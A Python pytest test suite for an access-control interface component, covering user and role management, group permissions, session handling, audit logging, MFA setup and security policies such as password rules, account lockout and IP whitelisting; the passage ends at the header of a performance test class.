"""
Comprehensive test suite for Access Control Interface component.

Tests the AccessControlInterface component with 95%+ coverage, including:
- User management (create, update, delete, lock/unlock)
- Role-based access control (RBAC)
- Permission system and inheritance
- Group-based access control
- Session management and monitoring
- Security audit logging
- Multi-factor authentication integration
- Security policy enforcement
- Performance under load
- Error handling and security edge cases
"""

import pytest
import asyncio
import json
import time
import hashlib
import uuid
from unittest.mock import Mock, patch, AsyncMock, MagicMock, call
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Any, Optional, Set
from dataclasses import dataclass
from enum import Enum

# Import the access control component to test
from agentsmcp.ui.components.access_control import (
    AccessControlInterface,
    User,
    Role,
    Permission,
    Group,
    Session,
    AuditLog,
    SecurityPolicy,
    AuthenticationMethod,
    AccessLevel,
    SecurityEvent
)


@dataclass
class MockUser:
    """Mock user for testing."""
    id: str
    username: str
    email: str
    roles: List[str]
    groups: List[str]
    active: bool = True
    locked: bool = False
    created_at: datetime = None
    last_login: Optional[datetime] = None
    failed_login_attempts: int = 0


@dataclass
class MockSession:
    """Mock session for testing."""
    id: str
    user_id: str
    created_at: datetime
    last_activity: datetime
    ip_address: str
    user_agent: str
    active: bool = True


@pytest.fixture
def mock_display_renderer():
    """Mock DisplayRenderer for testing."""
    renderer = Mock()
    renderer.create_panel = Mock(return_value="[Panel]")
    renderer.create_table = Mock(return_value="[Table]")
    renderer.create_tree_view = Mock(return_value="[Tree]")
    renderer.create_status_indicator = Mock(return_value="●")
    renderer.style_text = Mock(side_effect=lambda text, style: f"[{style}]{text}[/{style}]")
    renderer.create_security_badge = Mock(return_value="[Security Badge]")
    return renderer


@pytest.fixture
def mock_terminal_manager():
    """Mock TerminalManager for testing."""
    manager = Mock()
    manager.width = 120
    manager.height = 40
    manager.print = Mock()
    manager.clear = Mock()
    manager.get_size = Mock(return_value=(120, 40))
    return manager


@pytest.fixture
def mock_event_system():
    """Mock event system for testing."""
    event_system = Mock()
    event_system.emit = AsyncMock()
    event_system.subscribe = Mock()
    event_system.unsubscribe = Mock()
    return event_system


@pytest.fixture
def mock_security_backend():
    """Mock security backend for authentication and authorization."""
    backend = Mock()
    backend.authenticate = AsyncMock()
    backend.authorize = AsyncMock()
    backend.hash_password = Mock()
    backend.verify_password = Mock()
    backend.generate_session_token = Mock()
    backend.validate_session_token = Mock()
    backend.revoke_session = AsyncMock()
    return backend


@pytest.fixture
def access_control(mock_display_renderer, mock_terminal_manager, mock_event_system, mock_security_backend):
    """Create AccessControlInterface instance for testing."""
    interface = AccessControlInterface(
        display_renderer=mock_display_renderer,
        terminal_manager=mock_terminal_manager,
        event_system=mock_event_system,
        security_backend=mock_security_backend
    )
    return interface


@pytest.fixture
def sample_users():
    """Create sample users for testing."""
    return [
        MockUser(
            id="user1",
            username="admin",
            email="admin@example.com",
            roles=["admin", "user"],
            groups=["administrators"],
            created_at=datetime.now() - timedelta(days=30)
        ),
        MockUser(
            id="user2",
            username="manager",
            email="manager@example.com",
            roles=["manager", "user"],
            groups=["managers", "staff"],
            created_at=datetime.now() - timedelta(days=15),
            last_login=datetime.now() - timedelta(hours=2)
        ),
        MockUser(
            id="user3",
            username="viewer",
            email="viewer@example.com",
            roles=["viewer"],
            groups=["staff"],
            created_at=datetime.now() - timedelta(days=5),
            locked=True,
            failed_login_attempts=5
        )
    ]


class TestAccessControlInitialization:
    """Test Access Control Interface initialization and setup."""

    def test_initialization_success(self, access_control):
        """Test successful access control initialization."""
        assert access_control.display_renderer is not None
        assert access_control.terminal_manager is not None
        assert access_control.event_system is not None
        assert access_control.security_backend is not None
        assert hasattr(access_control, 'users')
        assert hasattr(access_control, 'roles')
        assert hasattr(access_control, 'permissions')
        assert hasattr(access_control, 'groups')
        assert hasattr(access_control, 'sessions')

    def test_default_roles_and_permissions_setup(self, access_control):
        """Test default roles and permissions are set up."""
        # Should have default system roles
        default_roles = ["admin", "manager", "user", "viewer"]
        
        for role_name in default_roles:
            role = access_control.get_role(role_name)
            assert role is not None
            assert role.name == role_name

    def test_security_policies_initialization(self, access_control):
        """Test security policies are initialized."""
        assert hasattr(access_control, 'security_policies')
        assert hasattr(access_control, '_password_policy')
        assert hasattr(access_control, '_session_policy')
        assert hasattr(access_control, '_audit_policy')

    def test_audit_logging_setup(self, access_control):
        """Test audit logging system setup."""
        assert hasattr(access_control, '_audit_logger')
        assert hasattr(access_control, 'audit_logs')
        assert hasattr(access_control, '_audit_retention_days')

    @pytest.mark.asyncio
    async def test_initialization_with_custom_policies(self):
        """Test initialization with custom security policies."""
        custom_policies = {
            'password_min_length': 12,
            'session_timeout_minutes': 60,
            'max_failed_login_attempts': 3,
            'require_mfa': True
        }
        
        with patch('agentsmcp.ui.v2.display_renderer.DisplayRenderer') as MockRenderer:
            with patch('agentsmcp.ui.v2.terminal_state_manager.TerminalManager') as MockManager:
                with patch('agentsmcp.ui.components.event_system.EventSystem') as MockEvents:
                    with patch('agentsmcp.ui.components.security_backend.SecurityBackend') as MockSecurity:
                        mock_renderer = MockRenderer.return_value
                        mock_manager = MockManager.return_value
                        mock_events = MockEvents.return_value
                        mock_security = MockSecurity.return_value
                        
                        interface = AccessControlInterface(
                            display_renderer=mock_renderer,
                            terminal_manager=mock_manager,
                            event_system=mock_events,
                            security_backend=mock_security,
                            **custom_policies
                        )
                        
                        assert interface._password_policy['min_length'] == 12
                        assert interface._session_policy['timeout_minutes'] == 60
                        assert interface._max_failed_login_attempts == 3


class TestUserManagement:
    """Test user management functionality."""

    @pytest.mark.asyncio
    async def test_create_user_success(self, access_control):
        """Test creating user successfully."""
        user_data = {
            "username": "newuser",
            "email": "newuser@example.com",
            "password": "SecurePassword123!",
            "roles": ["user"],
            "groups": ["staff"]
        }
        
        # Mock password hashing
        access_control.security_backend.hash_password.return_value = "hashed_password"
        
        result = await access_control.create_user(**user_data)
        
        assert result is not None
        assert result.username == "newuser"
        assert result.email == "newuser@example.com"
        assert "user" in result.roles
        assert result.id in access_control.users

    @pytest.mark.asyncio
    async def test_create_user_duplicate_username(self, access_control, sample_users):
        """Test creating user with duplicate username fails."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        user_data = {
            "username": user.username,  # Duplicate username
            "email": "different@example.com",
            "password": "password123"
        }
        
        with pytest.raises(ValueError, match="Username 'admin' already exists"):
            await access_control.create_user(**user_data)

    @pytest.mark.asyncio
    async def test_create_user_invalid_email(self, access_control):
        """Test creating user with invalid email fails."""
        user_data = {
            "username": "testuser",
            "email": "invalid-email",  # Invalid email format
            "password": "password123"
        }
        
        with pytest.raises(ValueError, match="Invalid email format"):
            await access_control.create_user(**user_data)

    @pytest.mark.asyncio
    async def test_create_user_weak_password(self, access_control):
        """Test creating user with weak password fails."""
        # Set strong password policy
        access_control._password_policy = {
            'min_length': 8,
            'require_uppercase': True,
            'require_lowercase': True,
            'require_digits': True,
            'require_special': True
        }
        
        user_data = {
            "username": "testuser",
            "email": "test@example.com",
            "password": "weak"  # Weak password
        }
        
        with pytest.raises(ValueError, match="Password does not meet policy requirements"):
            await access_control.create_user(**user_data)

    @pytest.mark.asyncio
    async def test_update_user_success(self, access_control, sample_users):
        """Test updating user successfully."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        updates = {
            "email": "updated@example.com",
            "roles": ["admin", "manager"],
            "active": False
        }
        
        result = await access_control.update_user(user.id, **updates)
        
        assert result is True
        updated_user = access_control.users[user.id]
        assert updated_user.email == "updated@example.com"
        assert "manager" in updated_user.roles
        assert updated_user.active is False

    @pytest.mark.asyncio
    async def test_update_user_nonexistent(self, access_control):
        """Test updating non-existent user fails."""
        with pytest.raises(ValueError, match="User 'nonexistent' not found"):
            await access_control.update_user("nonexistent", email="test@example.com")

    @pytest.mark.asyncio
    async def test_delete_user_success(self, access_control, sample_users):
        """Test deleting user successfully."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        result = await access_control.delete_user(user.id)
        
        assert result is True
        assert user.id not in access_control.users

    @pytest.mark.asyncio
    async def test_delete_user_with_active_sessions(self, access_control, sample_users):
        """Test deleting user with active sessions."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Create active session
        session = MockSession(
            id="session1",
            user_id=user.id,
            created_at=datetime.now(),
            last_activity=datetime.now(),
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        access_control.sessions[session.id] = session
        
        # Mock session revocation
        access_control.security_backend.revoke_session = AsyncMock(return_value=True)
        
        result = await access_control.delete_user(user.id, revoke_sessions=True)
        
        assert result is True
        assert user.id not in access_control.users
        access_control.security_backend.revoke_session.assert_called_once()

    @pytest.mark.asyncio
    async def test_lock_unlock_user(self, access_control, sample_users):
        """Test locking and unlocking user accounts."""
        user = sample_users[1]  # Active user
        access_control.users[user.id] = user
        
        # Lock user
        result = await access_control.lock_user(user.id, reason="Security policy violation")
        assert result is True
        assert access_control.users[user.id].locked is True
        
        # Unlock user
        result = await access_control.unlock_user(user.id)
        assert result is True
        assert access_control.users[user.id].locked is False

    def test_get_user_success(self, access_control, sample_users):
        """Test getting existing user."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        retrieved_user = access_control.get_user(user.id)
        assert retrieved_user is not None
        assert retrieved_user.username == user.username

    def test_get_user_by_username(self, access_control, sample_users):
        """Test getting user by username."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        retrieved_user = access_control.get_user_by_username(user.username)
        assert retrieved_user is not None
        assert retrieved_user.id == user.id

    def test_list_users_with_filters(self, access_control, sample_users):
        """Test listing users with various filters."""
        for user in sample_users:
            access_control.users[user.id] = user
        
        # All users
        all_users = access_control.list_users()
        assert len(all_users) == 3
        
        # Active users only
        active_users = access_control.list_users(active_only=True)
        assert len(active_users) == 2  # user3 is locked
        
        # Users with specific role
        admin_users = access_control.list_users(role="admin")
        assert len(admin_users) == 1
        assert admin_users[0].username == "admin"
        
        # Users in specific group
        staff_users = access_control.list_users(group="staff")
        assert len(staff_users) == 2  # manager and viewer


class TestRoleAndPermissionManagement:
    """Test role and permission management."""

    def test_create_role_success(self, access_control):
        """Test creating role successfully."""
        permissions = ["read_config", "write_config", "execute_tasks"]
        
        role = access_control.create_role(
            name="config_admin",
            description="Configuration administrator",
            permissions=permissions
        )
        
        assert role is not None
        assert role.name == "config_admin"
        assert set(role.permissions) == set(permissions)
        assert role.name in access_control.roles

    def test_create_role_duplicate_name(self, access_control):
        """Test creating role with duplicate name fails."""
        # Create first role
        access_control.create_role("duplicate_role", "First role")
        
        # Try to create duplicate
        with pytest.raises(ValueError, match="Role 'duplicate_role' already exists"):
            access_control.create_role("duplicate_role", "Second role")

    def test_update_role_permissions(self, access_control):
        """Test updating role permissions."""
        # Create role
        role = access_control.create_role("test_role", "Test role", ["read"])
        
        # Update permissions
        new_permissions = ["read", "write", "delete"]
        result = access_control.update_role(role.name, permissions=new_permissions)
        
        assert result is True
        updated_role = access_control.get_role(role.name)
        assert set(updated_role.permissions) == set(new_permissions)

    def test_delete_role_success(self, access_control):
        """Test deleting role successfully."""
        role = access_control.create_role("temp_role", "Temporary role")
        
        result = access_control.delete_role(role.name)
        
        assert result is True
        assert role.name not in access_control.roles

    def test_delete_role_with_assigned_users(self, access_control, sample_users):
        """Test deleting role assigned to users."""
        # Create role and assign to user
        role = access_control.create_role("assigned_role", "Role assigned to users")
        user = sample_users[0]
        user.roles.append(role.name)
        access_control.users[user.id] = user
        
        # Try to delete (should fail by default)
        with pytest.raises(ValueError, match="Role 'assigned_role' is assigned to users"):
            access_control.delete_role(role.name)
        
        # Force delete should work
        result = access_control.delete_role(role.name, force=True)
        assert result is True

    def test_permission_inheritance(self, access_control):
        """Test permission inheritance through role hierarchy."""
        # Create parent role
        parent_role = access_control.create_role(
            "parent_role", 
            "Parent role", 
            permissions=["read", "write"]
        )
        
        # Create child role inheriting from parent
        child_role = access_control.create_role(
            "child_role",
            "Child role",
            permissions=["delete"],
            parent_roles=["parent_role"]
        )
        
        # Get effective permissions (should include inherited)
        effective_permissions = access_control.get_effective_permissions(child_role.name)
        expected_permissions = {"read", "write", "delete"}
        
        assert set(effective_permissions) == expected_permissions

    def test_circular_role_inheritance_detection(self, access_control):
        """Test detection of circular role inheritance."""
        # Create roles
        role1 = access_control.create_role("role1", "Role 1")
        role2 = access_control.create_role("role2", "Role 2", parent_roles=["role1"])
        
        # Try to create circular inheritance
        with pytest.raises(ValueError, match="Circular inheritance detected"):
            access_control.update_role("role1", parent_roles=["role2"])

    def test_permission_checking(self, access_control):
        """Test permission checking functionality."""
        # Create role with specific permissions
        role = access_control.create_role(
            "test_checker",
            "Test role for permission checking",
            permissions=["read_users", "write_config"]
        )
        
        # Test permission checks
        assert access_control.role_has_permission("test_checker", "read_users") is True
        assert access_control.role_has_permission("test_checker", "delete_users") is False

    @pytest.mark.asyncio
    async def test_user_permission_checking(self, access_control, sample_users):
        """Test checking permissions for specific users."""
        user = sample_users[0]  # Admin user
        access_control.users[user.id] = user
        
        # Create admin role with permissions
        admin_role = access_control.create_role(
            "admin",
            "Administrator",
            permissions=["read_all", "write_all", "delete_all"]
        )
        
        # Check user permissions
        assert await access_control.user_has_permission(user.id, "read_all") is True
        assert await access_control.user_has_permission(user.id, "nonexistent_permission") is False


class TestGroupManagement:
    """Test group-based access control."""

    def test_create_group_success(self, access_control):
        """Test creating group successfully."""
        group = access_control.create_group(
            name="developers",
            description="Development team",
            permissions=["read_code", "write_code", "deploy_staging"]
        )
        
        assert group is not None
        assert group.name == "developers"
        assert "read_code" in group.permissions
        assert group.name in access_control.groups

    def test_add_user_to_group(self, access_control, sample_users):
        """Test adding user to group."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        group = access_control.create_group("test_group", "Test group")
        
        result = access_control.add_user_to_group(user.id, group.name)
        
        assert result is True
        assert group.name in access_control.users[user.id].groups

    def test_remove_user_from_group(self, access_control, sample_users):
        """Test removing user from group."""
        user = sample_users[1]  # Has groups
        access_control.users[user.id] = user
        
        original_group = user.groups[0]  # "managers"
        
        result = access_control.remove_user_from_group(user.id, original_group)
        
        assert result is True
        assert original_group not in access_control.users[user.id].groups

    def test_group_permission_inheritance(self, access_control, sample_users):
        """Test permission inheritance through group membership."""
        user = sample_users[2]  # Viewer user
        access_control.users[user.id] = user
        
        # Create group with permissions
        group = access_control.create_group(
            "special_access",
            "Special access group",
            permissions=["special_read", "special_write"]
        )
        
        # Add user to group
        access_control.add_user_to_group(user.id, group.name)
        
        # User should inherit group permissions
        effective_permissions = access_control.get_user_effective_permissions(user.id)
        assert "special_read" in effective_permissions
        assert "special_write" in effective_permissions

    def test_nested_group_membership(self, access_control):
        """Test nested group membership and permission inheritance."""
        # Create parent group
        parent_group = access_control.create_group(
            "parent_group",
            "Parent group",
            permissions=["parent_permission"]
        )
        
        # Create child group
        child_group = access_control.create_group(
            "child_group",
            "Child group",
            permissions=["child_permission"],
            parent_groups=["parent_group"]
        )
        
        # Get effective permissions
        effective_permissions = access_control.get_group_effective_permissions("child_group")
        
        assert "parent_permission" in effective_permissions
        assert "child_permission" in effective_permissions

    def test_group_hierarchy_validation(self, access_control):
        """Test group hierarchy validation."""
        # Create groups
        group1 = access_control.create_group("group1", "Group 1")
        group2 = access_control.create_group("group2", "Group 2", parent_groups=["group1"])
        
        # Try to create circular hierarchy
        with pytest.raises(ValueError, match="Circular group hierarchy"):
            access_control.update_group("group1", parent_groups=["group2"])


class TestSessionManagement:
    """Test session management and monitoring."""

    @pytest.mark.asyncio
    async def test_create_session_success(self, access_control, sample_users):
        """Test creating session successfully."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        session_data = {
            "ip_address": "192.168.1.100",
            "user_agent": "Test Browser 1.0",
            "authentication_method": "password"
        }
        
        access_control.security_backend.generate_session_token.return_value = "session_token_123"
        
        session = await access_control.create_session(user.id, **session_data)
        
        assert session is not None
        assert session.user_id == user.id
        assert session.ip_address == "192.168.1.100"
        assert session.active is True
        assert session.id in access_control.sessions

    @pytest.mark.asyncio
    async def test_create_session_locked_user(self, access_control, sample_users):
        """Test creating session for locked user fails."""
        user = sample_users[2]  # Locked user
        access_control.users[user.id] = user
        
        with pytest.raises(ValueError, match="User account is locked"):
            await access_control.create_session(user.id, ip_address="192.168.1.1")

    @pytest.mark.asyncio
    async def test_validate_session_success(self, access_control, sample_users):
        """Test validating active session."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Create session
        session = MockSession(
            id="session123",
            user_id=user.id,
            created_at=datetime.now(),
            last_activity=datetime.now(),
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        access_control.sessions[session.id] = session
        
        access_control.security_backend.validate_session_token.return_value = True
        
        result = await access_control.validate_session(session.id, "token123")
        
        assert result is True

    @pytest.mark.asyncio
    async def test_validate_session_expired(self, access_control, sample_users):
        """Test validating expired session fails."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Create expired session
        session = MockSession(
            id="expired_session",
            user_id=user.id,
            created_at=datetime.now() - timedelta(hours=25),  # Old session
            last_activity=datetime.now() - timedelta(hours=2),  # Inactive
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        access_control.sessions[session.id] = session
        
        # Set session timeout policy
        access_control._session_policy = {"timeout_minutes": 60, "idle_timeout_minutes": 30}
        
        result = await access_control.validate_session(session.id, "token123")
        
        assert result is False

    @pytest.mark.asyncio
    async def test_revoke_session_success(self, access_control, sample_users):
        """Test revoking session successfully."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        session = MockSession(
            id="revoke_test",
            user_id=user.id,
            created_at=datetime.now(),
            last_activity=datetime.now(),
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        access_control.sessions[session.id] = session
        
        access_control.security_backend.revoke_session.return_value = True
        
        result = await access_control.revoke_session(session.id)
        
        assert result is True
        assert session.id not in access_control.sessions

    @pytest.mark.asyncio
    async def test_revoke_all_user_sessions(self, access_control, sample_users):
        """Test revoking all sessions for a user."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Create multiple sessions for user
        sessions = []
        for i in range(3):
            session = MockSession(
                id=f"session_{i}",
                user_id=user.id,
                created_at=datetime.now(),
                last_activity=datetime.now(),
                ip_address=f"192.168.1.{i+1}",
                user_agent="Test Agent"
            )
            sessions.append(session)
            access_control.sessions[session.id] = session
        
        access_control.security_backend.revoke_session.return_value = True
        
        result = await access_control.revoke_all_user_sessions(user.id)
        
        assert result is True
        
        # All user sessions should be revoked
        for session in sessions:
            assert session.id not in access_control.sessions

    def test_get_active_sessions(self, access_control, sample_users):
        """Test getting active sessions."""
        user1 = sample_users[0]
        user2 = sample_users[1]
        access_control.users[user1.id] = user1
        access_control.users[user2.id] = user2
        
        # Create mix of active and inactive sessions
        sessions = [
            MockSession(
                id="active1", user_id=user1.id, created_at=datetime.now(),
                last_activity=datetime.now(), ip_address="192.168.1.1", 
                user_agent="Agent 1", active=True
            ),
            MockSession(
                id="inactive1", user_id=user1.id, created_at=datetime.now(),
                last_activity=datetime.now(), ip_address="192.168.1.2",
                user_agent="Agent 2", active=False
            ),
            MockSession(
                id="active2", user_id=user2.id, created_at=datetime.now(),
                last_activity=datetime.now(), ip_address="192.168.1.3",
                user_agent="Agent 3", active=True
            )
        ]
        
        for session in sessions:
            access_control.sessions[session.id] = session
        
        # Get all active sessions
        active_sessions = access_control.get_active_sessions()
        assert len(active_sessions) == 2
        
        # Get active sessions for specific user
        user1_sessions = access_control.get_active_sessions(user_id=user1.id)
        assert len(user1_sessions) == 1
        assert user1_sessions[0].id == "active1"

    def test_session_activity_tracking(self, access_control):
        """Test session activity tracking."""
        session = MockSession(
            id="activity_test",
            user_id="user1",
            created_at=datetime.now() - timedelta(minutes=30),
            last_activity=datetime.now() - timedelta(minutes=10),
            ip_address="192.168.1.1",
            user_agent="Test Agent"
        )
        access_control.sessions[session.id] = session
        
        # Update activity
        access_control.update_session_activity(session.id)
        
        # Last activity should be updated
        updated_session = access_control.sessions[session.id]
        time_diff = datetime.now() - updated_session.last_activity
        assert time_diff.total_seconds() < 1  # Should be very recent


class TestSecurityAuditLogging:
    """Test security audit logging functionality."""

    @pytest.mark.asyncio
    async def test_audit_log_user_creation(self, access_control):
        """Test audit logging for user creation."""
        user_data = {
            "username": "audit_test_user",
            "email": "audit@example.com",
            "password": "SecurePassword123!",
            "roles": ["user"]
        }
        
        access_control.security_backend.hash_password.return_value = "hashed_password"
        
        # Create user
        await access_control.create_user(**user_data)
        
        # Check audit log
        audit_logs = access_control.get_audit_logs(action="user_created")
        assert len(audit_logs) == 1
        
        log_entry = audit_logs[0]
        assert log_entry.action == "user_created"
        assert log_entry.resource_type == "user"
        assert user_data["username"] in log_entry.details

    @pytest.mark.asyncio
    async def test_audit_log_failed_authentication(self, access_control, sample_users):
        """Test audit logging for failed authentication."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Mock failed authentication
        access_control.security_backend.authenticate.return_value = None
        
        # Attempt authentication
        try:
            await access_control.authenticate_user(user.username, "wrong_password")
        except:
            pass  # Expected to fail
        
        # Check audit log
        audit_logs = access_control.get_audit_logs(action="authentication_failed")
        assert len(audit_logs) == 1
        
        log_entry = audit_logs[0]
        assert log_entry.action == "authentication_failed"
        assert log_entry.user_id == user.id

    @pytest.mark.asyncio
    async def test_audit_log_permission_changes(self, access_control, sample_users):
        """Test audit logging for permission changes."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        # Update user permissions
        await access_control.update_user(user.id, roles=["admin", "manager", "super_admin"])
        
        # Check audit log
        audit_logs = access_control.get_audit_logs(action="user_updated")
        assert len(audit_logs) == 1
        
        log_entry = audit_logs[0]
        assert log_entry.action == "user_updated"
        assert "roles" in log_entry.details

    def test_audit_log_filtering_and_search(self, access_control):
        """Test audit log filtering and search functionality."""
        # Create sample audit logs
        logs = [
            AuditLog(
                id="log1",
                timestamp=datetime.now() - timedelta(hours=1),
                user_id="user1",
                action="user_created",
                resource_type="user",
                resource_id="new_user1",
                details={"username": "test1"}
            ),
            AuditLog(
                id="log2",
                timestamp=datetime.now() - timedelta(minutes=30),
                user_id="user2",
                action="authentication_failed",
                resource_type="session",
                resource_id="session1",
                details={"reason": "invalid_password"}
            ),
            AuditLog(
                id="log3",
                timestamp=datetime.now() - timedelta(minutes=10),
                user_id="user1",
                action="permission_changed",
                resource_type="user",
                resource_id="user1",
                details={"old_roles": ["user"], "new_roles": ["admin"]}
            )
        ]
        
        for log in logs:
            access_control.audit_logs.append(log)
        
        # Filter by user
        user1_logs = access_control.get_audit_logs(user_id="user1")
        assert len(user1_logs) == 2
        
        # Filter by action
        auth_logs = access_control.get_audit_logs(action="authentication_failed")
        assert len(auth_logs) == 1
        
        # Filter by time range
        recent_logs = access_control.get_audit_logs(
            since=datetime.now() - timedelta(minutes=45),
            until=datetime.now()
        )
        assert len(recent_logs) == 2  # Last two logs

    def test_audit_log_retention_policy(self, access_control):
        """Test audit log retention policy enforcement."""
        # Set retention policy
        access_control._audit_retention_days = 30
        
        # Create old audit logs
        old_logs = [
            AuditLog(
                id=f"old_log_{i}",
                timestamp=datetime.now() - timedelta(days=35),
                user_id="user1",
                action="test_action",
                resource_type="test",
                resource_id=f"resource_{i}",
                details={}
            )
            for i in range(5)
        ]
        
        for log in old_logs:
            access_control.audit_logs.append(log)
        
        initial_count = len(access_control.audit_logs)
        
        # Enforce retention policy
        access_control.enforce_audit_retention_policy()
        
        # Old logs should be removed
        final_count = len(access_control.audit_logs)
        assert final_count < initial_count

    def test_security_event_correlation(self, access_control):
        """Test security event correlation and alerting."""
        user_id = "suspicious_user"
        
        # Generate multiple failed login attempts
        for i in range(5):
            event = SecurityEvent(
                id=f"event_{i}",
                timestamp=datetime.now() - timedelta(minutes=i),
                event_type="authentication_failed",
                user_id=user_id,
                source_ip="192.168.1.100",
                details={"attempt": i+1}
            )
            access_control.record_security_event(event)
        
        # Check if correlation detects suspicious activity
        suspicious_activities = access_control.detect_suspicious_activities(user_id)
        
        assert len(suspicious_activities) > 0
        assert "multiple_failed_logins" in [activity["type"] for activity in suspicious_activities]


class TestMultiFactorAuthentication:
    """Test multi-factor authentication integration."""

    @pytest.mark.asyncio
    async def test_setup_mfa_for_user(self, access_control, sample_users):
        """Test setting up MFA for user."""
        user = sample_users[0]
        access_control.users[user.id] = user
        
        mfa_secret = "JBSWY3DPEHPK3PXP"
        qr_code_url = "https://example.com/qr"
        
        # Mock MFA setup
        with patch.object(access_control, '_generate_mfa_secret', return_value=mfa_secret):
            with patch.object(access_control, '_generate_qr_code', return_value=qr_code_url):
                
                result = await access_control.setup_mfa(user.id, method="totp")
                
                assert result["secret"] == mfa_secret
                assert result["qr_code_url"] == qr_code_url
                
                # User should have MFA enabled
                updated_user = access_control.get_user(user.id)
                assert updated_user.mfa_enabled is True

    @pytest.mark.asyncio
    async def test_verify_mfa_token_success(self, access_control, sample_users):
        """Test successful MFA token verification."""
        user = sample_users[0]
        user.mfa_enabled = True
        user.mfa_secret = "JBSWY3DPEHPK3PXP"
        access_control.users[user.id] = user
        
        # Mock successful token verification
        with patch.object(access_control, '_verify_totp_token', return_value=True):
            result = await access_control.verify_mfa_token(user.id, "123456")
            
            assert result is True

    @pytest.mark.asyncio
    async def test_verify_mfa_token_failure(self, access_control, sample_users):
        """Test failed MFA token verification."""
        user = sample_users[0]
        user.mfa_enabled = True
        user.mfa_secret = "JBSWY3DPEHPK3PXP"
        access_control.users[user.id] = user
        
        # Mock failed token verification
        with patch.object(access_control, '_verify_totp_token', return_value=False):
            result = await access_control.verify_mfa_token(user.id, "000000")
            
            assert result is False

    @pytest.mark.asyncio
    async def test_authentication_with_mfa_required(self, access_control, sample_users):
        """Test authentication when MFA is required."""
        user = sample_users[0]
        user.mfa_enabled = True
        access_control.users[user.id] = user
        
        # Mock successful password authentication
        access_control.security_backend.authenticate.return_value = user
        
        # First step - password authentication
        auth_result = await access_control.authenticate_user(user.username, "correct_password")
        
        # Should return partial success requiring MFA
        assert auth_result["status"] == "mfa_required"
        assert auth_result["user_id"] == user.id

    @pytest.mark.asyncio
    async def test_disable_mfa_for_user(self, access_control, sample_users):
        """Test disabling MFA for user."""
        user = sample_users[0]
        user.mfa_enabled = True
        user.mfa_secret = "JBSWY3DPEHPK3PXP"
        access_control.users[user.id] = user
        
        result = await access_control.disable_mfa(user.id)
        
        assert result is True
        
        updated_user = access_control.get_user(user.id)
        assert updated_user.mfa_enabled is False
        assert updated_user.mfa_secret is None


class TestSecurityPolicyEnforcement:
    """Test security policy enforcement."""

    def test_password_policy_enforcement(self, access_control):
        """Test password policy enforcement."""
        # Set strict password policy
        access_control._password_policy = {
            'min_length': 12,
            'require_uppercase': True,
            'require_lowercase': True,
            'require_digits': True,
            'require_special': True,
            'forbidden_patterns': ['password', '123456', 'qwerty']
        }
        
        # Test various passwords
        test_cases = [
            ("StrongP@ssw0rd123", True),   # Should pass
            ("weakpass", False),          # Too short, missing requirements
            ("PASSWORD123!", False),      # No lowercase
            ("password123!", False),      # Forbidden pattern
            ("Short1!", False),           # Too short
            ("NoSpecialChars123", False), # No special characters
        ]
        
        for password, should_pass in test_cases:
            result = access_control.validate_password(password)
            assert result == should_pass, f"Password '{password}' validation failed"

    @pytest.mark.asyncio
    async def test_account_lockout_policy(self, access_control, sample_users):
        """Test account lockout policy enforcement."""
        user = sample_users[1]  # Active user
        access_control.users[user.id] = user
        access_control._max_failed_login_attempts = 3
        
        # Mock failed authentication attempts
        access_control.security_backend.authenticate.return_value = None
        
        # Attempt multiple failed logins
        for i in range(4):
            try:
                await access_control.authenticate_user(user.username, "wrong_password")
            except:
                pass
        
        # User should be locked after max attempts
        locked_user = access_control.get_user(user.id)
        assert locked_user.locked is True
        assert locked_user.failed_login_attempts >= 3

    def test_session_timeout_policy(self, access_control):
        """Test session timeout policy enforcement."""
        access_control._session_policy = {
            'timeout_minutes': 120,      # 2 hours max
            'idle_timeout_minutes': 30   # 30 minutes idle
        }
        
        now = datetime.now()
        
        # Test active session within limits
        active_session = MockSession(
            id="active",
            user_id="user1",
            created_at=now - timedelta(minutes=60),
            last_activity=now - timedelta(minutes=10),
            ip_address="192.168.1.1",
            user_agent="Test"
        )
        
        assert access_control.is_session_valid(active_session) is True
        
        # Test session exceeding max timeout
        old_session = MockSession(
            id="old",
            user_id="user1", 
            created_at=now - timedelta(hours=3),  # Too old
            last_activity=now - timedelta(hours=2),
            ip_address="192.168.1.1",
            user_agent="Test"
        )
        
        assert access_control.is_session_valid(old_session) is False
        
        # Test idle session
        idle_session = MockSession(
            id="idle",
            user_id="user1",
            created_at=now - timedelta(minutes=30),
            last_activity=now - timedelta(minutes=45),  # Too idle
            ip_address="192.168.1.1", 
            user_agent="Test"
        )
        
        assert access_control.is_session_valid(idle_session) is False

    def test_role_elevation_policy(self, access_control, sample_users):
        """Test role elevation policy enforcement."""
        user = sample_users[1]  # Manager user
        access_control.users[user.id] = user
        
        # Set elevation policy
        access_control._elevation_policy = {
            'require_reauthentication': True,
            'elevation_timeout_minutes': 15,
            'require_approval': ['admin']
        }
        
        # Test elevation to admin role
        can_elevate = access_control.can_user_elevate_role(user.id, "admin")
        
        # Should require additional verification
        assert can_elevate is False or "requires_approval" in str(can_elevate)

    def test_ip_whitelist_policy(self, access_control):
        """Test IP whitelist policy enforcement."""
        access_control._ip_policy = {
            'whitelist_enabled': True,
            'allowed_ips': ['192.168.1.0/24', '10.0.0.0/8'],
            'blocked_ips': ['192.168.1.100']
        }
        
        # Test allowed IP
        assert access_control.is_ip_allowed('192.168.1.50') is True
        assert access_control.is_ip_allowed('10.0.0.1') is True
        
        # Test blocked IP
        assert access_control.is_ip_allowed('192.168.1.100') is False
        
        # Test disallowed IP
        assert access_control.is_ip_allowed('203.0.113.1') is False


class TestPerformanceAndScalability:
